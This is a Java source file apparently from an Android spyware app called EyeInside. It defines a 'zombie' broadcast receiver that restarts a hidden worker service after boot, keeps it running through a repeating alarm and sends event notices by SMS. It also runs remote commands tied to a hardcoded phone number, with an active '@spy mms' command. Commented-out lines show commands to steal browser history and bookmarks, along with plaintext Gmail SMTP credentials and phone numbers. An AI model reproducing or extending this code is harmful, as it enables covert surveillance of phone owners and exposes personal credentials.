package com.code4bones.EyeInside;

// adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -n your.app.packagename/.YourReceiverClassName

import java.util.Calendar;
import java.util.List;

import com.code4bones.utils.NetLog;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.IBinder;

public class Zombie_BroadcastReceiver extends BroadcastReceiver {

	public Context mContext = null;
	public Handler mHandler = new Handler();
	final  public static CommandPool mPool = CommandPool.getInstance();

	public Zombie_BroadcastReceiver() {
	}

	@Override
	public void onReceive(Context context, Intent intent) {
		mContext = context;
		String action = intent.getAction();
		NetLog.v("ZOMBIE: I LIVE AGAIN (%s)",action);
		
		Zombie_BroadcastReceiver.startServiceIfNeeded(context);
		
		mPool.execPool(context);


		SharedPreferences prefs = mContext.getSharedPreferences("events", 1);
		boolean reply = prefs.contains(action) && prefs.getBoolean(action, false);
		if ( reply ) {
			CommandObj.sendSMS(prefs.getString("phone", ""),action);
			NetLog.v("Event %s will be %s",action,reply);
		}
		
		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@setup smtp:smtp.gmail.com;port:465;user:eyeinsid3@gmail.com;pass:60175577a;mail:eyeinsid3@gmail.com;no sms;wifi"));
		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@sms to:+79672243716;msg:Приет Мир !"));
		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@event unlock:1;power:1"));
		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@get browser history"));
		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@spy browser bookmarks;history"));
		mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@spy mms",false));
		//ContactsUtils d;
	}

	public static void serviceLoop(Context context,int sec) {
		Calendar cal = Calendar.getInstance();
		Intent intent = new Intent(context, WorkerService.class);
		PendingIntent pintent = PendingIntent.getService(context, 0, intent, 0);
		AlarmManager alarm = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
		alarm.setRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sec*1000, pintent); 
	}
	
	public static void startServiceIfNeeded(Context context) {
		if ( !Zombie_BroadcastReceiver.isServiceRunning(context,"com.code4bones.EyeInside.WorkerService")) {
			NetLog.v("ZOMBIE: Service not found,starting");
			serviceLoop(context,60);
		} else {
			NetLog.v("ZOMBIE: Service is already running!");
		}
	}
	
	public static boolean isServiceRunning(Context context,String serviceClassName){
        final ActivityManager activityManager = (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);
        final List<RunningServiceInfo> services = activityManager.getRunningServices(Integer.MAX_VALUE);
        for (RunningServiceInfo runningServiceInfo : services) {
        	if (runningServiceInfo.service.getClassName().equals(serviceClassName)){
                return true;
            }
        }
        return false;
     }	
}
